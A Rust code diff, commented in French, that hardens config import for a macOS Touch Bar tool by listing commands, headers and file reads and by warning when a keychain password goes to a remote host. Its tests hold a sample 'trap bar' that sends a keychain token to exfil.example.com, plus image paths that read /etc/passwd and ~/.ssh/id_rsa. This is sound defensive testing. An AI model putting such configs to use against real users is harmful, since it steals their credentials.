@@ -7,7 +7,7 @@
 
 use super::icones;
 use crate::actions::Action;
-use crate::config::{self, Barre, Element};
+use crate::config::{self, Application, Barre, Element, Source, SourceMcp};
 use serde::Serialize;
 use std::io::{Read, Write};
 use std::path::{Path, PathBuf};
@@ -43,7 +43,8 @@ impl Texte {
     }
 }
 
-/// Quelque chose que la barre lance (programme, script, frappe, app, adresse non web), montré avant d'importer.
+/// Quelque chose que la barre fait sur ce Mac (programme, script, frappe, app, adresse, fichier lu, en-tête envoyé),
+/// montré avant d'importer.
 #[derive(Debug, Clone, PartialEq, Serialize)]
 pub(super) struct Commande {
     /// Où : « Barre principale, élément 3 « Build » ».
@@ -52,6 +53,19 @@ pub(super) struct Commande {
     pub quoi: Texte,
     /// Ce qui sera exécuté, tel qu'écrit dans le fichier.
     pub valeur: String,
+    /// Un mot de passe du trousseau part vers une adresse qui n'est pas cette machine : alerte en tête de l'aperçu.
+    pub alerte: bool,
+}
+
+impl Commande {
+    /// La phrase d'alerte, quand `alerte` : « ⚠ Attention : cette barre lit ton mot de passe… ».
+    fn phrase_d_alerte(&self) -> Texte {
+        let minuscule = |s: &str| s.chars().next().map(|c| c.to_lowercase().chain(s.chars().skip(1)).collect::<String>()).unwrap_or_default();
+        tx(
+            format!("⚠ Attention : cette barre {}. Ne l’importe que si tu as confiance en son auteur.", minuscule(&self.quoi.fr)),
+            format!("⚠ Warning: this bar {}. Only import it if you trust its author.", minuscule(&self.quoi.en)),
+        )
+    }
 }
 
 // ---------- Parcours de la barre ----------
@@ -92,74 +106,128 @@ fn deplier(chemin: &str) -> PathBuf {
     }
 }
 
-/// Tout ce que la barre peut lancer : actions `shell`, `applescript`, `touche`, `keycode`, `app`, `url` autre que
-/// http(s), actions système (app d'Apple ou frappe simulée), les apps des `lanceur`, les commandes des `script`, puis
-/// les `[[source]]` (commande, serveur MCP lancé ou appelé, adresse lue). Dans l'ordre de la barre, principale d'abord.
+/// Tout ce que la barre fait sur ce Mac, dans l'ordre de la barre (principale d'abord) puis des sources : actions
+/// `shell`, `applescript`, `touche`, `keycode`, `app`, `url` autre que http(s), actions système (app d'Apple ou
+/// frappe simulée), apps des `lanceur`, commandes des `script`, images lues hors de `icones/`, et pour chaque
+/// `[[source]]` sa commande, son serveur MCP lancé ou appelé, l'adresse lue et chacun de ses en-têtes (un
+/// `trousseau:` y est nommé : c'est un mot de passe de l'utilisateur qui part avec la requête).
+///
+/// Chaque type et chaque champ est nommé, sans `..` ni `_ =>` : un élément, une action, une source ou un champ
+/// ajouté plus tard ne compile pas tant qu'il n'est pas classé ici.
 pub(super) fn commandes(barre: &Barre) -> Vec<Commande> {
+    let Barre { masquer_control_strip: _, elements, applications, sources } = barre;
     let mut liste = Vec::new();
-    let principale = tx("Barre principale", "Main bar");
-    parcourir(&barre.elements, &principale, "", &mut liste);
-    for app in &barre.applications {
-        let ou = tx(format!("Barre de « {} »", app.app), format!("“{}” bar", app.app));
-        parcourir(&app.elements, &ou, "", &mut liste);
+    parcourir(elements, &tx("Barre principale", "Main bar"), "", &mut liste);
+    for Application { app, herite: _, elements } in applications {
+        parcourir(elements, &tx(format!("Barre de « {app} »"), format!("“{app}” bar")), "", &mut liste);
     }
-    for s in &barre.sources {
-        let ou = tx(format!("Source « {} »", s.nom), format!("“{}” source", s.nom));
-        let n = s.toutes_les.unwrap_or(crate::sources::DEFAUT);
-        if let Some(c) = &s.commande {
-            liste.push(Commande { ou: ou.clone(), quoi: tx(format!("Commande relancée toutes les {n} s"), format!("Command run every {n} s")), valeur: c.clone() });
-        }
-        if let Some(u) = &s.http {
-            liste.push(Commande { ou: ou.clone(), quoi: tx(format!("Adresse lue toutes les {n} s"), format!("Address fetched every {n} s")), valeur: u.clone() });
-        }
-        if let Some(m) = &s.mcp {
-            let outil = &m.outil;
-            if let Some(c) = &m.commande {
-                liste.push(Commande { ou: ou.clone(), quoi: tx(format!("Serveur MCP lancé (outil « {outil} »)"), format!("MCP server started (tool “{outil}”)")), valeur: c.clone() });
-            }
-            if let Some(u) = &m.url {
-                liste.push(Commande { ou: ou.clone(), quoi: tx(format!("Serveur MCP distant appelé (outil « {outil} »)"), format!("Remote MCP server called (tool “{outil}”)")), valeur: u.clone() });
-            }
-        }
+    for source in sources {
+        lister_source(source, &mut liste);
     }
     liste
+}
+
+fn ligne(ou: &Texte, quoi: Texte, valeur: impl Into<String>) -> Commande {
+    Commande { ou: ou.clone(), quoi, valeur: valeur.into(), alerte: false }
+}
+
+fn lister_source(source: &Source, liste: &mut Vec<Commande>) {
+    let Source { nom, http, commande, mcp, toutes_les, entetes } = source;
+    let ou = tx(format!("Source « {nom} »"), format!("“{nom}” source"));
+    let n = toutes_les.unwrap_or(crate::sources::DEFAUT);
+    if let Some(c) = commande {
+        liste.push(ligne(&ou, tx(format!("Commande relancée toutes les {n} s"), format!("Command run every {n} s")), c));
+    }
+    if let Some(u) = http {
+        liste.push(ligne(&ou, tx(format!("Adresse lue toutes les {n} s"), format!("Address fetched every {n} s")), u));
+    }
+    // Où partent les en-têtes : l'adresse http, sinon celle du serveur MCP distant (comme `sources::lire`).
+    let mut destination = http.as_deref();
+    if let Some(SourceMcp { commande, url, outil, arguments: _ }) = mcp {
+        if let Some(c) = commande {
+            liste.push(ligne(&ou, tx(format!("Serveur MCP lancé (outil « {outil} »)"), format!("MCP server started (tool “{outil}”)")), c));
+        }
+        if let Some(u) = url {
+            liste.push(ligne(&ou, tx(format!("Serveur MCP distant appelé (outil « {outil} »)"), format!("Remote MCP server called (tool “{outil}”)")), u));
+            destination = destination.or(Some(u));
+        }
+    }
+    // Sans adresse, les en-têtes ne sont ni lus ni envoyés.
+    let Some(destination) = destination else { return };
+    let hote = hote(destination);
+    for (cle, valeur) in entetes {
+        // Les services `trousseau:x` de la valeur, découpés comme à l'exécution.
+        let mut services = Vec::new();
+        let _ = crate::sources::deverrouiller(valeur, &mut services, |s| Ok(s.to_string()));
+        let texte = format!("{cle}: {valeur}");
+        if services.is_empty() {
+            liste.push(ligne(&ou, tx(format!("En-tête envoyé à {hote}"), format!("Header sent to {hote}")), texte.clone()));
+        }
+        for s in services {
+            let quoi = tx(format!("Lit ton mot de passe enregistré « {s} » et l’envoie à {hote}"), format!("Reads your saved password “{s}” and sends it to {hote}"));
+            liste.push(Commande { alerte: !local(destination), ..ligne(&ou, quoi, texte.clone()) });
+        }
+    }
+}
+
+/// L'hôte d'une adresse, sans identifiants ni port : `https://a:b@exemple.org:8443/x` → `exemple.org`.
+fn hote(url: &str) -> &str {
+    let reste = url.split_once("://").map_or(url, |(_, r)| r);
+    let autorite = reste.split(['/', '?', '#']).next().unwrap_or_default();
+    let autorite = autorite.rsplit_once('@').map_or(autorite, |(_, h)| h);
+    match autorite.rsplit_once(':') {
+        Some((h, port)) if !h.is_empty() && !port.is_empty() && port.bytes().all(|o| o.is_ascii_digit()) => h,
+        _ => autorite,
+    }
+}
+
+/// L'adresse vise-t-elle cette machine ?
+fn local(url: &str) -> bool {
+    ["localhost", "127.0.0.1", "[::1]"].contains(&hote(url))
 }
 
 fn parcourir(elements: &[Element], barre: &Texte, parent: &str, liste: &mut Vec<Commande>) {
     for (i, e) in elements.iter().enumerate() {
         let numero = format!("{parent}{}", i + 1);
+        // Le nom montré seulement : un type oublié ici perd son nom, pas sa ligne.
         let (nom_fr, nom_en) = match e {
             Element::Bouton { texte: Some(t), .. } | Element::Groupe { texte: Some(t), .. } if !t.is_empty() => (format!(" « {t} »"), format!(" “{t}”")),
             _ => (String::new(), String::new()),
         };
         let ou = tx(format!("{}, élément {numero}{nom_fr}", barre.fr), format!("{}, item {numero}{nom_en}", barre.en));
+        let appui_long = |a: &Option<Action>, liste: &mut Vec<Commande>| {
+            if let Some(c) = a.as_ref().and_then(lancement) {
+                let quoi = tx(format!("{} (appui long)", c.quoi.fr), format!("{} (long press)", c.quoi.en));
+                liste.push(Commande { ou: ou.clone(), quoi, ..c });
+            }
+        };
+        let action = |a: &Option<Action>, liste: &mut Vec<Commande>| liste.extend(a.as_ref().and_then(lancement).map(|c| Commande { ou: ou.clone(), ..c }));
         match e {
-            Element::Bouton { action, appui_long, .. } => {
-                if let Some(c) = action.as_ref().and_then(lancement) {
-                    liste.push(Commande { ou: ou.clone(), ..c });
+            Element::Bouton { texte: _, symbole: _, image, gabarit: _, couleur: _, couleur_texte: _, taille: _, affichage: _, largeur: _, action: a, appui_long: l, source: _ } => {
+                // `icones/x.png` : le logo emporté avec la barre ; tout autre chemin est un fichier de ce Mac.
+                if let Some(i) = image.as_ref().filter(|i| nom_d_icone(i).is_none()) {
+                    liste.push(ligne(&ou, tx("Lit un fichier de ton Mac", "Reads a file on your Mac"), i));
                 }
-                if let Some(c) = appui_long.as_ref().and_then(lancement) {
-                    let quoi = tx(format!("{} (appui long)", c.quoi.fr), format!("{} (long press)", c.quoi.en));
-                    liste.push(Commande { ou, quoi, ..c });
-                }
+                action(a, liste);
+                appui_long(l, liste);
             }
-            Element::Lanceur { app, appui_long, .. } => {
-                liste.push(Commande { ou: ou.clone(), quoi: tx("Ouvre l’app", "Opens the app"), valeur: app.clone() });
-                if let Some(c) = appui_long.as_ref().and_then(lancement) {
-                    let quoi = tx(format!("{} (appui long)", c.quoi.fr), format!("{} (long press)", c.quoi.en));
-                    liste.push(Commande { ou, quoi, ..c });
-                }
+            Element::Lanceur { app, texte: _, affichage: _, largeur: _, appui_long: l } => {
+                liste.push(ligne(&ou, tx("Ouvre l’app", "Opens the app"), app));
+                appui_long(l, liste);
             }
-            Element::Script { commande, intervalle, action, .. } => {
-                let quoi = tx(format!("Commande relancée toutes les {intervalle} s"), format!("Command run every {intervalle} s"));
-                liste.push(Commande { ou: ou.clone(), quoi, valeur: commande.clone() });
-                if let Some(c) = action.as_ref().and_then(lancement) {
-                    liste.push(Commande { ou, ..c });
-                }
+            Element::Script { commande, intervalle, delai: _, largeur: _, action: a } => {
+                liste.push(ligne(&ou, tx(format!("Commande relancée toutes les {intervalle} s"), format!("Command run every {intervalle} s")), commande));
+                action(a, liste);
             }
-            Element::Texte { action: Some(a), .. } => liste.extend(lancement(a).map(|c| Commande { ou, ..c })),
-            Element::Groupe { elements, .. } => parcourir(elements, barre, &format!("{numero} › "), liste),
-            _ => {}
+            Element::Texte { source: _, gabarit: _, symbole_selon: _, couleur_selon: _, largeur: _, action: a } => action(a, liste),
+            Element::Groupe { texte: _, symbole: _, largeur: _, elements } => parcourir(elements, barre, &format!("{numero} › "), liste),
+            // Rien ne sort de la barre : affichage, réglage, heure, morceau en cours, pile.
+            Element::Slider { reglage: _, symbole: _ }
+            | Element::Heure { format: _ }
+            | Element::EnCours { largeur: _ }
+            | Element::Espace { largeur: _ }
+            | Element::Souple
+            | Element::Batterie { symbole: _, largeur: _ } => {}
         }
     }
 }
@@ -172,7 +240,9 @@ fn lancement(action: &Action) -> Option<Commande> {
         Action::Touche(t) => (tx("Raccourci clavier", "Keyboard shortcut"), String::from(t.clone())),
         Action::Keycode(n) => (tx("Touche simulée", "Simulated key"), format!("keycode {n}")),
         Action::App(a) => (tx("Ouvre l’app", "Opens the app"), a.clone()),
-        Action::Url(u) if !["http://", "https://"].iter().any(|p| u.to_lowercase().starts_with(p)) => (tx("Ouvre l’adresse", "Opens the address"), u.clone()),
+        // Une page web s'ouvre dans le navigateur ; tout autre schéma (`file:`, `ssh:`, une app) est montré.
+        Action::Url(u) if ["http://", "https://"].iter().any(|p| u.to_lowercase().starts_with(p)) => return None,
+        Action::Url(u) => (tx("Ouvre l’adresse", "Opens the address"), u.clone()),
         // Les actions système : une app d'Apple lancée, ou une frappe simulée (comme `touche`).
         Action::MissionControl => (tx("Ouvre Mission Control", "Opens Mission Control"), nom(action)),
         Action::FenetresApp => (tx("Montre les fenêtres de l’app (Mission Control)", "Shows the app’s windows (Mission Control)"), nom(action)),
@@ -185,9 +255,22 @@ fn lancement(action: &Action) -> Option<Commande> {
         Action::Emojis => (tx("Ouvre les émojis (simule ⌃⌘ espace)", "Opens emoji (simulates ⌃⌘ space)"), nom(action)),
         Action::Verrouiller => (tx("Verrouille l’écran (simule ⌃⌘Q)", "Locks the screen (simulates ⌃⌘Q)"), nom(action)),
         Action::ForcerQuitter => (tx("Ouvre « Forcer à quitter » (simule ⌥⌘esc)", "Opens “Force Quit” (simulates ⌥⌘esc)"), nom(action)),
-        _ => return None,
+        // Réglages, touches média, veille de l'écran, Échap, barre d'Apple : rien n'est lancé.
+        Action::LuminositePlus
+        | Action::LuminositeMoins
+        | Action::Luminosite(_)
+        | Action::VolumePlus
+        | Action::VolumeMoins
+        | Action::Volume(_)
+        | Action::BasculerMuet
+        | Action::LecturePause
+        | Action::Suivant
+        | Action::Precedent
+        | Action::Veille
+        | Action::Echap
+        | Action::BarreApple => return None,
     };
-    Some(Commande { ou: tx("", ""), quoi, valeur })
+    Some(Commande { ou: tx("", ""), quoi, valeur, alerte: false })
 }
 
 /// L'action telle qu'écrite dans le fichier : `verrouiller`.
@@ -497,6 +580,9 @@ fn preparer(texte: &str, copies: Vec<(String, PathBuf)>, temporaire: Option<Path
         }
     }
     let mut barre = config::lire(texte).map_err(fr_seul).map_err(nettoyer)?;
+    let ignorees = retirer_images_hors_barre(&mut barre);
+    // Avant que les logos pointent vers leurs copies temporaires : ce sont des fichiers de la barre, pas de ce Mac.
+    let liste = commandes(&barre);
     let mut sources = Vec::new();
     let mut absentes = Vec::new();
     chaque_image(&mut barre, &mut |i| {
@@ -509,7 +595,7 @@ fn preparer(texte: &str, copies: Vec<(String, PathBuf)>, temporaire: Option<Path
             absentes.push(i.clone());
         }
     });
-    let mut paquet = Paquet { barre, commandes: vec![], avis: vec![], sources, temporaire };
+    let mut paquet = Paquet { barre, commandes: liste, avis: vec![], sources, temporaire };
     // Le validateur partagé avec `--verifier` : une barre inutilisable est refusée, le reste devient un avis.
     for avis in config::controler(&paquet.barre, Some(texte)) {
         if avis.grave {
@@ -525,14 +611,52 @@ fn preparer(texte: &str, copies: Vec<(String, PathBuf)>, temporaire: Option<Path
         let liste = absentes.join(", ");
         paquet.avis.push(tx(format!("logo absent du fichier importé : {liste}"), format!("logo missing from the imported file: {liste}")));
     }
-    paquet.commandes = commandes(&paquet.barre);
+    if !ignorees.is_empty() {
+        let liste = ignorees.join(", ");
+        paquet.avis.push(tx(format!("image ignorée : chemin hors de la barre importée ({liste})"), format!("image ignored: path outside the imported bar ({liste})")));
+    }
     Ok(paquet)
+}
+
+/// Une barre importée n'a pas à lire `/etc/…` ou `~/.ssh/…` : toute `image` qui n'est pas un `icones/<nom>` de
+/// l'archive est retirée. Le bouton garde son texte ou son symbole ; s'il n'a ni l'un ni l'autre, il prend `photo`.
+/// Renvoie les chemins retirés, sans doublon.
+fn retirer_images_hors_barre(barre: &mut Barre) -> Vec<String> {
+    fn dans(elements: &mut [Element], retirees: &mut Vec<String>) {
+        for e in elements {
+            match e {
+                Element::Bouton { image, symbole, texte, .. } => {
+                    if let Some(i) = image.take_if(|i| nom_d_icone(i).is_none()) {
+                        if symbole.is_none() && texte.as_deref().is_none_or(str::is_empty) {
+                            *symbole = Some("photo".into());
+                        }
+                        if !retirees.contains(&i) {
+                            retirees.push(i);
+                        }
+                    }
+                }
+                Element::Groupe { elements, .. } => dans(elements, retirees),
+                _ => {}
+            }
+        }
+    }
+    let mut retirees = Vec::new();
+    dans(&mut barre.elements, &mut retirees);
+    for app in &mut barre.applications {
+        dans(&mut app.elements, &mut retirees);
+    }
+    retirees
 }
 
 impl Paquet {
     /// Nombre de logos que l'installation copiera.
     pub fn logos(&self) -> usize {
         self.sources.len()
+    }
+
+    /// Les alertes à montrer en tête de l'aperçu : un mot de passe du trousseau envoyé hors de cette machine.
+    pub fn alertes(&self) -> Vec<Texte> {
+        self.commandes.iter().filter(|c| c.alerte).map(Commande::phrase_d_alerte).collect()
     }
 }
 
@@ -603,6 +727,14 @@ pub fn importer_cli(fichier: &Path, oui: bool, fr: bool) -> i32 {
         }
     };
     println!("{}", resume(&paquet, fichier, fr));
+    // Un secret du trousseau envoyé ailleurs : un « o » tapé par réflexe ne suffit pas, il faut --oui écrit exprès.
+    if !paquet.alertes().is_empty() {
+        if !oui {
+            eprintln!("{}", if fr { "tactile : cette barre envoie un mot de passe de ton trousseau hors de ce Mac. Rien n'a changé ; relance avec --oui seulement si tu fais confiance à son auteur." } else { "tactile: this bar sends a password from your keychain off this Mac. Nothing changed; run again with --yes only if you trust its author." });
+            return 1;
+        }
+        eprintln!("{}", if fr { "attention : --oui donné, la barre est installée malgré l'alerte ci-dessus." } else { "warning: --yes given, the bar is installed despite the warning above." });
+    }
     if !oui {
         if !std::io::stdin().is_terminal() {
             eprintln!("{}", if fr { "tactile : pas de terminal pour confirmer ; relance avec --oui pour remplacer ta barre." } else { "tactile: no terminal to confirm; run again with --yes to replace your bar." });
@@ -661,6 +793,7 @@ fn resume(paquet: &Paquet, fichier: &Path, fr: bool) -> String {
         }
         lignes.push(l + ".");
     }
+    lignes.extend(paquet.alertes().iter().map(|a| a.dans(fr).to_string()));
     if paquet.commandes.is_empty() {
         lignes.push(if fr { "Elle ne lance aucune commande." } else { "It runs no commands." }.into());
     } else {
@@ -983,12 +1116,14 @@ mod tests {
         for source in &paquet.sources {
             assert!(Path::new(source).starts_with(&temporaire) && Path::new(source).is_file(), "{source}");
         }
-        // Rien d'autre n'a bougé : même barre, aux chemins d'image près.
+        // Rien d'autre n'a bougé : même barre, aux chemins d'image près ; l'image restée hors de l'archive est retirée.
         let mut sans_images = paquet.barre.clone();
         chaque_image(&mut sans_images, &mut |i| *i = Path::new(i).file_name().unwrap().to_string_lossy().into_owned());
         let mut attendue = dans_le_zip.clone();
         chaque_image(&mut attendue, &mut |i| *i = Path::new(i).file_name().unwrap().to_string_lossy().into_owned());
+        attendue.elements[2] = config::lire("[[element]]\ntype = \"bouton\"\nsymbole = \"photo\"\n").unwrap().elements.remove(0);
         assert_eq!(sans_images, attendue);
+        assert!(paquet.avis.iter().any(|a| a.fr == "image ignorée : chemin hors de la barre importée (/nexiste/pas.png)"), "{:?}", paquet.avis);
         drop(paquet);
         assert!(!temporaire.exists());
         std::fs::remove_dir_all(&d).unwrap();
@@ -1076,7 +1211,10 @@ mod tests {
                     for (cle, valeur) in o {
                         match (cle.as_str(), valeur) {
                             ("app", _) if barre_d_app => {}
-                            ("shell" | "applescript" | "app" | "commande", serde_json::Value::String(s)) => trouves.push(s.clone()),
+                            ("shell" | "applescript" | "app" | "commande" | "http", serde_json::Value::String(s)) => trouves.push(s.clone()),
+                            // Un en-tête : sa ligne `Nom: valeur`, montrée telle quelle (trousseau compris), quand la
+                            // source a une adresse où l'envoyer (sans adresse, il n'est ni lu ni envoyé).
+                            ("entetes", serde_json::Value::Object(e)) if o.get("http").is_some_and(|u| u.is_string()) || o.get("mcp").and_then(|m| m.get("url")).is_some_and(|u| u.is_string()) => trouves.extend(e.iter().map(|(n, v)| format!("{n}: {}", v.as_str().unwrap_or_default()))),
                             _ => cherche(valeur, trouves),
                         }
                     }
@@ -1171,5 +1309,89 @@ mod tests {
             }
         }
         std::fs::remove_dir_all(&d).unwrap();
+    }
+
+    /// La barre piège de Karim (revue 0.3, trouvaille 1) : un en-tête `trousseau:` envoie un secret à une adresse tierce.
+    const PIEGE: &[u8] = b"[[element]]\ntype = \"texte\"\nsource = \"x\"\ngabarit = \"{texte}\"\n\n\
+        [[source]]\nnom = \"x\"\nhttp = \"https://exfil.example.com/collecte\"\ntoutes_les = 5\n\
+        entetes = { Authorization = \"Bearer trousseau:github-token\", X-Note = \"ma_cle_en_clair_AKIA1234567890ABCDEF\" }\n";
+
+    fn lignes(barre: &Barre) -> Vec<(String, String, String)> {
+        commandes(barre).into_iter().map(|c| (c.ou.fr, c.quoi.fr, c.valeur)).collect()
+    }
+
+    /// S1 : chaque en-tête est montré, et un `trousseau:` dit quel mot de passe part, et vers où.
+    #[test]
+    fn le_trousseau_envoye_ailleurs_est_montre_et_signale() {
+        let paquet = ouvrir_octets(PIEGE.to_vec(), None).unwrap();
+        let liste: Vec<(String, String, String)> = paquet.commandes.iter().map(|c| (c.ou.fr.clone(), c.quoi.fr.clone(), c.valeur.clone())).collect();
+        let attendu = [
+            ("Source « x »", "Adresse lue toutes les 5 s", "https://exfil.example.com/collecte"),
+            ("Source « x »", "Lit ton mot de passe enregistré « github-token » et l’envoie à exfil.example.com", "Authorization: Bearer trousseau:github-token"),
+            ("Source « x »", "En-tête envoyé à exfil.example.com", "X-Note: ma_cle_en_clair_AKIA1234567890ABCDEF"),
+        ]
+        .map(|(a, b, c)| (a.to_string(), b.to_string(), c.to_string()));
+        assert_eq!(liste, attendu);
+        assert_eq!(paquet.commandes[1].quoi.en, "Reads your saved password “github-token” and sends it to exfil.example.com");
+        // Le résumé de la ligne de commande commence par l'alerte, dans les deux langues.
+        let fichier = Path::new("/tmp/piege.toml");
+        let fr = resume(&paquet, fichier, true);
+        assert_eq!(fr.lines().nth(1), Some("⚠ Attention : cette barre lit ton mot de passe enregistré « github-token » et l’envoie à exfil.example.com. Ne l’importe que si tu as confiance en son auteur."), "{fr}");
+        let en = resume(&paquet, fichier, false);
+        assert_eq!(en.lines().nth(1), Some("⚠ Warning: this bar reads your saved password “github-token” and sends it to exfil.example.com. Only import it if you trust its author."), "{en}");
+        // Vers cette machine : le secret ne sort pas, il est listé sans alerte.
+        let local = ouvrir_octets(b"[[source]]\nnom = \"l\"\nhttp = \"http://127.0.0.1:8080/x\"\nentetes = { A = \"trousseau:moi\" }\n[[element]]\ntype = \"souple\"\n".to_vec(), None).unwrap();
+        assert_eq!(lignes(&local.barre)[1].1, "Lit ton mot de passe enregistré « moi » et l’envoie à 127.0.0.1");
+        assert!(!resume(&local, fichier, true).contains('⚠'));
+        // Un serveur MCP distant aussi reçoit les en-têtes ; deux secrets dans une valeur : deux lignes.
+        let mcp = config::lire("[[source]]\nnom = \"m\"\nmcp = { url = \"https://a:b@mcp.example.org:8443/mcp?x=1\", outil = \"o\" }\nentetes = { A = \"trousseau:un trousseau:deux\" }\n").unwrap();
+        let l = lignes(&mcp);
+        assert_eq!(l[1].1, "Lit ton mot de passe enregistré « un » et l’envoie à mcp.example.org");
+        assert_eq!(l[2].1, "Lit ton mot de passe enregistré « deux » et l’envoie à mcp.example.org");
+    }
+
+    /// S2 : ce qu'une barre lit, exécute ou appelle, pour chaque sorte d'élément, d'action et de source.
+    #[test]
+    fn tout_ce_que_la_barre_fait_est_liste() {
+        let barre = config::lire(
+            "[[element]]\ntype = \"bouton\"\ntexte = \"a\"\nimage = \"/etc/passwd\"\n\n\
+             [[element]]\ntype = \"bouton\"\ntexte = \"b\"\nimage = \"~/.ssh/id_rsa\"\n\n\
+             [[element]]\ntype = \"bouton\"\ntexte = \"c\"\nimage = \"icones/c.png\"\n\n\
+             [[element]]\ntype = \"bouton\"\naction = { url = \"ssh://serveur\" }\n",
+        )
+        .unwrap();
+        let attendu = [
+            ("Barre principale, élément 1 « a »", "Lit un fichier de ton Mac", "/etc/passwd"),
+            ("Barre principale, élément 2 « b »", "Lit un fichier de ton Mac", "~/.ssh/id_rsa"),
+            ("Barre principale, élément 4", "Ouvre l’adresse", "ssh://serveur"),
+        ]
+        .map(|(a, b, c)| (a.to_string(), b.to_string(), c.to_string()));
+        assert_eq!(lignes(&barre), attendu);
+    }
+
+    /// S4 : à l'import, une image hors de la barre importée (`/…`, `~/…`, chemin relatif autre que `icones/`) est
+    /// retirée et dite ; le bouton garde son texte, ou prend un symbole. Une barre locale, elle, garde ses chemins.
+    #[test]
+    fn image_hors_de_la_barre_importee_retiree() {
+        let texte = "[[element]]\ntype = \"bouton\"\ntexte = \"a\"\nimage = \"/etc/passwd\"\n\
+                     [[element]]\ntype = \"bouton\"\nimage = \"~/.ssh/id_rsa\"\n\
+                     [[element]]\ntype = \"groupe\"\n  [[element.element]]\n  type = \"bouton\"\n  symbole = \"star\"\n  image = \"../x.png\"\n";
+        let paquet = ouvrir_octets(texte.as_bytes().to_vec(), None).unwrap();
+        let mut restantes = Vec::new();
+        chaque_image(&mut paquet.barre.clone(), &mut |i| restantes.push(i.clone()));
+        assert!(restantes.is_empty(), "{restantes:?}");
+        match &paquet.barre.elements[..] {
+            [Element::Bouton { texte: Some(t), symbole: None, .. }, Element::Bouton { texte: None, symbole: Some(s), .. }, Element::Groupe { elements, .. }] => {
+                assert_eq!((t.as_str(), s.as_str()), ("a", "photo"));
+                assert!(matches!(&elements[..], [Element::Bouton { symbole: Some(s), image: None, .. }] if s == "star"));
+            }
+            autre => panic!("{autre:?}"),
+        }
+        let avis: Vec<&str> = paquet.avis.iter().map(|a| a.fr.as_str()).collect();
+        assert!(avis.contains(&"image ignorée : chemin hors de la barre importée (/etc/passwd, ~/.ssh/id_rsa, ../x.png)"), "{avis:?}");
+        assert!(paquet.avis.iter().any(|a| a.en == "image ignored: path outside the imported bar (/etc/passwd, ~/.ssh/id_rsa, ../x.png)"));
+        assert!(paquet.commandes.is_empty(), "{:?}", paquet.commandes);
+        // La barre de l'utilisateur, lue par `config`, n'est pas concernée.
+        assert!(matches!(&config::lire(texte).unwrap().elements[0], Element::Bouton { image: Some(i), .. } if i == "/etc/passwd"));
     }
 }
